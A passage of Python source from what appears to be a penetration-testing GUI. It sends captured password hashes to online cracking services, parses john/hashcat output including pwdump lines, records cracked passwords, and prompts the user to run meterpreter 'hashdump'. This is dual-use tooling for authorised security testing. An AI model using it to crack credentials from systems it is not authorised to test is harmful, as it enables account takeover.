                    print(f"[hawk] mark_cracked failed: {e}")
                cred.cracked = True
                cred.cracked_pass = cracked
                self.refresh()
                self.app.terminal.write(
                    f"  [+] ONLINE CRACKED — "
                    f"{cred.username}:{cracked}", "success")

            def _on_done(ok, msg):
                if not ok:
                    self.app.terminal.write(
                        f"  [-] online crack failed: {msg}", "warn")

            HashesComJob(
                api_key=api_key,
                hash_str=hash_str, hash_type=hash_type,
                on_status=_on_status,
                on_found=_on_found,
                on_done=_on_done,
                ui_dispatcher=getattr(
                    self.app, "ui_call", None)).start()

        key = store.get(service_id)
        if key:
            _with_key(key)
        else:
            show_api_key_prompt(
                self, self.app, service_id,
                on_key_ready=_with_key)

    def _start_online_browser_crack(self, hash_str, service_id):
        """Non-API services: copy hash to clipboard, open URL."""
        from utils.online_crack import open_in_browser, SERVICES
        svc = SERVICES.get(service_id, {})
        ok = open_in_browser(service_id, hash_str)
        if ok:
            self.app.terminal.write(
                f"  [+] {svc.get('name', service_id)} opened in "
                f"browser — hash on clipboard, paste it in the site "
                f"form.", "info")
        else:
            self.app.terminal.write(
                f"  [!] Could not launch browser for "
                f"{svc.get('name', service_id)}. "
                f"Open manually: {svc.get('url', '')}", "warn")

    def _poll_crack_result(self, result_file, tool, cred_id, username):
        """Poll for cracked password from john/hashcat --show output file.

        `cred_id` is the credential's stable id — held for up to 10
        minutes while the crack runs, so it must survive an unrelated
        delete that would slide any list position out from under us."""
        import threading

        def _check():
            import time
            # Wait for xterm to finish and write the result file
            for _ in range(600):  # up to 10 min
                time.sleep(1)
                if not os.path.exists(result_file):
                    continue
                try:
                    with open(result_file) as f:
                        content = f.read().strip()
                except Exception:
                    continue
                if not content:
                    continue

                # Parse result — john and hashcat emit "hash:password" for a
                # raw hash file; john may also emit pwdump-style
                # "user:password:rid:LM:NT:::" if the pot has legacy entries.
                # An empty password field (e.g. "Guest::501:...:31d6cfe0...:::")
                # IS a valid crack result — it means the account literally has
                # no password, not "no hashes cracked".
                cracked_pass = None
                cracked_user = None  # username extracted from pwdump-style line
                cracked_marker = False  # "1 password hash cracked" seen?
                for line in content.splitlines():
                    line = line.strip()
                    if not line:
                        continue
                    low = line.lower()
                    if ("password hash cracked" in low
                            and not low.startswith("0 password")):
                        cracked_marker = True
                    # Status / noise lines
                    if (low.startswith("0 password")
                            or "no hashes" in low
                            or low.startswith("using default")
                            or "password hashes cracked" in low
                            or "loaded" in low and "hash" in low):
                        continue
                    if ":" not in line:
                        continue
                    fields = line.split(":")
                    candidate = None
                    cand_user = None
                    is_empty_pwd = False
                    # Pwdump-style (>=6 fields, field[2] numeric rid) → field[1]
                    # John's --show on a pwdump file prints:
                    #   Administrator:vagrant:500:aad...:e02bc...:::
                    # so fields[0] is the username and fields[1] is the password.
                    if len(fields) >= 6 and re.fullmatch(r"\d+", fields[2] or "0"):
                        candidate = fields[1]
                        cand_user = fields[0] or None
                        # Empty password field + known NT-of-empty hash → valid!
                        if candidate == "":
                            nt = fields[4] if len(fields) > 4 else ""
                            if nt.lower() == "31d6cfe0d16ae931b73c59d7e0c089c0":
                                is_empty_pwd = True
                    else:
                        # Simple "hash:password" → everything after first colon
                        candidate = line.split(":", 1)[1]
                    if candidate == "" and not is_empty_pwd:
                        continue
                    # Reject hex-only long strings (that'd be a hash, not a pwd)
                    if (candidate and len(candidate) >= 16
                            and re.fullmatch(r"[a-fA-F0-9]+", candidate)):
                        continue
                    cracked_pass = "(empty)" if is_empty_pwd else candidate
                    cracked_user = cand_user
                    break

                # Fallback: if john said "1 password hash cracked" but we
                # couldn't extract the password from the output, still mark
                # cracked so the user at least sees SHOW RESULT.
                if cracked_pass is None and cracked_marker:
                    # Fallback when the john output says "1 password hash
                    # cracked" but we couldn't extract the plaintext from
                    # the stream.  Tell the user to inspect the xterm
                    # scrollback — the modern CrackRunner path uses
                    # per-run pot/outfile files, not a shared pot.
                    cracked_pass = "(cracked — inspect the john xterm output)"

                if cracked_pass:
                    def _update():
                        sess = self.app.session_manager.current
                        if sess:
                            sess.mark_cracked_by_id(cred_id, cracked_pass)
                            # Pair username too, whenever john gave us one and
                            # the credential didn't already have one set.
                            try:
                                # Deleted mid-crack → get_credential_by_id
                                # returns None; skip the pairing rather than
                                # touch whatever now sits at an old index.
                                cd = sess.get_credential_by_id(cred_id)
                                if cd is not None:
                                    if (cracked_user
                                            and not (cd.get("username") or "").strip()):
                                        cd["username"] = cracked_user
                                        sess._touch()
                                    # Also strip any pwdump prefix still stuck in
                                    # hash_val — keeps later re-cracks from choking.
                                    hv = cd.get("hash_val") or ""
                                    p_u, p_h, p_ht = split_username_hash(hv)
                                    if p_u and p_h and p_h != hv:
                                        cd["hash_val"] = p_h
                                        if (p_ht and p_ht != "Unknown"
                                                and not cd.get("hash_type")):
                                            cd["hash_type"] = p_ht
                                        if not (cd.get("username") or "").strip():
                                            cd["username"] = p_u
                                        sess._touch()
                            except Exception as e:
                                print(f"[hawk] username pair after crack failed: {e}")
                            sess.save()
                        self.refresh()
                        cd_final = (sess.get_credential_by_id(cred_id)
                                    if sess else None)
                        final_user = (cracked_user
                                      or (cd_final.get("username")
                                          if cd_final else "")
                                      or username or "?")
                        self.app.terminal.write(
                            f"  [+] CRACKED! {final_user} → {cracked_pass}",
                            "success")
                    self.app.after(0, _update)
                else:
                    def _no_result():
                        self.app.terminal.write(
                            f"  [*] No cracked password found for {username}.", "dim")
                    self.app.after(0, _no_result)

                # Cleanup
                try:
                    os.remove(result_file)
                except Exception:
                    pass
                return
            # Timeout — cleanup
            try:
                os.remove(result_file)
            except Exception:
                pass

        t = threading.Thread(target=_check, daemon=True)
        t.start()

    def _extract_credentials(self):
        self.app.terminal.write(
            "  [*] Run 'hashdump' in meterpreter, then use IMPORT.", "info")
